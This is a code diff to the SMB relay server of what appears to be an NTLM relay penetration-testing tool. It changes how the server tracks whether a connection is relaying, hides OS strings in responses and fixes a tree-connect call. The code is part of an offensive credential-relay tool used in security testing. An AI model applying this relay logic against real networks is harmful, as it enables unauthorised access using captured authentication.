@@ -234,7 +234,7 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if not self.config.disableMulti and 'relayToHost' not in connData:
+        if not self.config.disableMulti and (('relayToHost' not in connData) or not connData['relayToHost']):
             # Just call the original SessionSetup
             respCommands, respPackets, errorCode = self.origSmbSessionSetup(connId, smbServer, recvPacket)
             # We remove the Guest flag
@@ -384,7 +384,7 @@ class SMBRelayServer(Thread):
 
                 connData['Authenticated'] = True
                 if not self.config.disableMulti:
-                    del(connData['relayToHost'])
+                    connData['relayToHost'] = False
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
@@ -553,7 +553,7 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if not self.config.disableMulti and 'relayToHost' not in connData:
+        if not self.config.disableMulti and (('relayToHost' not in connData) or not connData['relayToHost']):
             # Just call the original SessionSetup
             return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
         # We have confirmed we want to relay to the target host.
@@ -687,7 +687,7 @@ class SMBRelayServer(Thread):
 
                 # Done with the relay for now.
                 connData['Authenticated'] = True
-                del(connData['relayToHost'])
+                connData['relayToHost'] = False
 
                 # Status SUCCESS
                 errorCode = STATUS_SUCCESS
@@ -759,13 +759,13 @@ class SMBRelayServer(Thread):
                 # Done with the relay for now.
                 connData['Authenticated'] = True
                 if not self.config.disableMulti:
-                    del(connData['relayToHost'])
+                    connData['relayToHost'] = False
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
 
-        respData['NativeOS']     = smbServer.getServerOS()
-        respData['NativeLanMan'] = smbServer.getServerOS()
+        #respData['NativeOS']     = smbServer.getServerOS()
+        #respData['NativeLanMan'] = smbServer.getServerOS()
         respSMBCommand['Parameters'] = respParameters
         respSMBCommand['Data']       = respData
 
@@ -781,7 +781,7 @@ class SMBRelayServer(Thread):
         self.authUser = authenticateMessage.getUserString()
 
         if self.config.disableMulti:
-            return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
+            return self.origsmbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
         # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
         # are processed. There might be a use case for this
         #if 'relayToHost' in connData:
